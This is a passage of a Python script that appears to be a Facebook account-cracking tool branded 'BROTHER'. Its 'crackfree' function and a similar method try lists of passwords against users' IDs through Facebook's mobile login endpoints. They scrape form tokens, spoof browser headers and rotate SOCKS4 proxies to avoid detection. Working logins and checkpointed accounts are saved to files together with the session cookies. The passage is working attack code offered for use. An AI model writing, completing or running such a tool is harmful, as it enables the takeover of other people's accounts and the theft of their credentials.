            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="116", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',}
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mBROTHER-CP\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> {idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \033[1;92m{pw}')
                print(f'\033[38;5;196m────────────────────────────────────────────────\033[1;37m')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                CP+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mBROTHER-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[🌺]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                print(f'\033[38;5;196m────────────────────────────────────────────────\033[1;37m')
                os.system('espeak -a 300 " BROTHER,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#------------------[ METHODE-MBASIC-2 ]-------------------#
 
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[BROTHER-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="116", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mBROTHER-Cp🖤\033[1;91m] {idf} • {pw}')
                print(f'\033[38;5;196m───────────────────────────────────────────────\033[1;37m')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                CP+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•BROTHER-Ok💙] \033[1;92m{idf} • \033[1;92m{pw} ')
                print(f'\033[38;5;196m────────────────────────────────────────────────\033[1;37m')
                os.system('espeak -a 300 " BROTHER,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#-----------------------[ SYSTEM-CONTROL ]--------------------#
 
if __name__=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
menu()